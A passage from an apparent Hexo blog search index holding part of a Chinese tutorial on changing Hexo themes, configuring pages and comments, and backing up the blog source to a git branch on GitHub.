title="更换主题"></a>更换主题</h2><p>可以直接下载一个主题到 <code>themes</code> 文件夹下，将 <code>_config.yml</code> 中的主题名改为需要更换的</p><p>主题中心</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hexo.io/themes/</span><br></pre></td></tr></table></figure><p>全部弄好后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>想要修改主题配置，可以去所使用的主题文件夹下，找到 <code>_config.yml</code> 并修改</p><p>可以修改侧边栏、页脚等，侧边栏中都是页面，新建页面自定义设计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;分类&quot;</span></span><br></pre></td></tr></table></figure><p><code>friends</code> 、<code>tags</code> 、<code>categories</code> 、<code>about</code> 分别修改对应文件夹下 <code>index.md</code> 为如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2019-05-03 12:03:35</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>修改主题下的配置文件，将评论插件下的 <code>enabled</code> 改为 <code>true</code> ，然后按照教程进行评论配置</p><h2 id="备份博客"><a href="#备份博客" class="headerlink" title="备份博客"></a>备份博客</h2><p>在 <code>myBlog</code> 下，使用 <code>git</code> 将博客仓库克隆到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/&#123;用户名&#125;/&#123;用户名&#125;.github.io.git</span><br></pre></td></tr></table></figure><p>进入 <code>&#123;用户名&#125;.github.io</code> 文件夹，删除其中除了 <code>.git</code> 的所有文件，然后复制 <code>blog</code> 文件夹下的所有文件到本文件夹下</p><p>查看 <code>.gitignore</code> 文件，使其为如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.<span class="built_in">log</span></span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure><p>切换分支，并提交所有更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b hexo</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;hexo&quot;</span></span><br><span class="line">git push origin hexo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
